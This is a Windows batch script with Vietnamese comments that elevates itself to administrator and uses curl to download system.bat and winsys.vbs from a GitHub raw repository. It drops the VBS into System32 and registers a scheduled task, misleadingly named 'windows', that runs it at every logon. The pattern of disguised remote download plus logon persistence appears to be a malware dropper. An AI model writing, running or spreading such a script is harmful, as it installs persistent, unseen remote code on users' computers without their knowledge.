@echo off
:: Kiem tra quyen quan tri
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Vui long chay voi quyen quan tri.
    powershell -command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit
)

:: Thiet lap bien
set "systemDownloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/system.bat"
set "systemDestinationDir=C:\Program Files\Windows NT\ADB"
set "systemDownloadFile=system.bat"
set "winsysDownloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/winsys.vbs"
set "winsysDestinationDir=C:\Windows\System32"
set "winsysDownloadFile=winsys.vbs"
set "logFile=%systemDestinationDir%\task_history_log.txt"

:: Tao thu muc neu chua ton tai cho system.bat
if not exist "%systemDestinationDir%" (
    echo Thu muc %systemDestinationDir% khong ton tai. Dang tao thu muc...
    mkdir "%systemDestinationDir%"
)

:: Tai xuong system.bat
echo Dang tai xuong system.bat...
echo %date% %time% - Bat dau tai xuong tu %systemDownloadUrl% >> "%logFile%"
curl -L -o "%systemDestinationDir%\%systemDownloadFile%" "%systemDownloadUrl%"

:: Kiem tra xem system.bat da tai xuong thanh cong chua
if exist "%systemDestinationDir%\%systemDownloadFile%" (
    echo %date% %time% - system.bat da tai xuong thanh cong. >> "%logFile%"
) else (
    echo %date% %time% - Tai xuong system.bat that bai. >> "%logFile%"
    exit
)

:: Tao thu muc neu chua ton tai cho winsys.vbs
if not exist "%winsysDestinationDir%" (
    echo Thu muc %winsysDestinationDir% khong ton tai. Dang tao thu muc...
    mkdir "%winsysDestinationDir%"
)

:: Tai xuong winsys.vbs
echo Dang tai xuong winsys.vbs...
echo %date% %time% - Bat dau tai xuong tu %winsysDownloadUrl% >> "%logFile%"
curl -L -o "%winsysDestinationDir%\%winsysDownloadFile%" "%winsysDownloadUrl%"

:: Kiem tra xem winsys.vbs da tai xuong thanh cong chua
if exist "%winsysDestinationDir%\%winsysDownloadFile%" (
    echo %date% %time% - winsys.vbs da tai xuong thanh cong. >> "%logFile%"
) else (
    echo %date% %time% - Tai xuong winsys.vbs that bai. >> "%logFile%"
    exit
)

:: Tao tac vu trong Task Scheduler de chay winsys.vbs
echo Dang tao tac vu...
schtasks /create /tn "windows" /tr "\"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /f

:: Kiem tra ket qua
if %errorlevel% neq 0 (
    echo %date% %time% - Tao tac vu that bai. >> "%logFile%"
    echo Tao tac vu that bai.
) else (
    echo %date% %time% - Tac vu tao thanh cong. >> "%logFile%"
    echo Tac vu tao thanh cong.
)

exit
